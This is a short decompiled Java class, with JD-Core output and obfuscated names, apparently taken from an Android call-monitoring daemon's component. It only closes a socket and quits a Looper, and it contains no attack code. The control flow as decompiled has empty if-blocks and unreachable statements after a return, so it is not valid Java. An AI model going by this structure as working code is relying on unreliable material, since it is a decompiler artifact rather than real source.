package com.vvt.callmanager;

import android.os.Looper;
import com.fx.socket.b;
import java.util.concurrent.Callable;

class e
  implements Callable
{
  e(CallMonDaemonMain paramCallMonDaemonMain) {}
  
  public Void a()
  {
    Object localObject = this.a;
    boolean bool = CallMonDaemonMain.c((CallMonDaemonMain)localObject);
    if (bool) {}
    localObject = CallMonDaemonMain.d(this.a);
    if (localObject != null)
    {
      localObject = this.a;
      bool = CallMonDaemonMain.c((CallMonDaemonMain)localObject);
      if (bool) {}
      localObject = CallMonDaemonMain.d(this.a);
      ((b)localObject).a();
    }
    for (;;)
    {
      localObject = this.a;
      bool = CallMonDaemonMain.c((CallMonDaemonMain)localObject);
      if (bool) {}
      return null;
      localObject = CallMonDaemonMain.e(this.a);
      if (localObject != null)
      {
        localObject = this.a;
        bool = CallMonDaemonMain.c((CallMonDaemonMain)localObject);
        if (bool) {}
        localObject = CallMonDaemonMain.e(this.a);
        ((Looper)localObject).quit();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */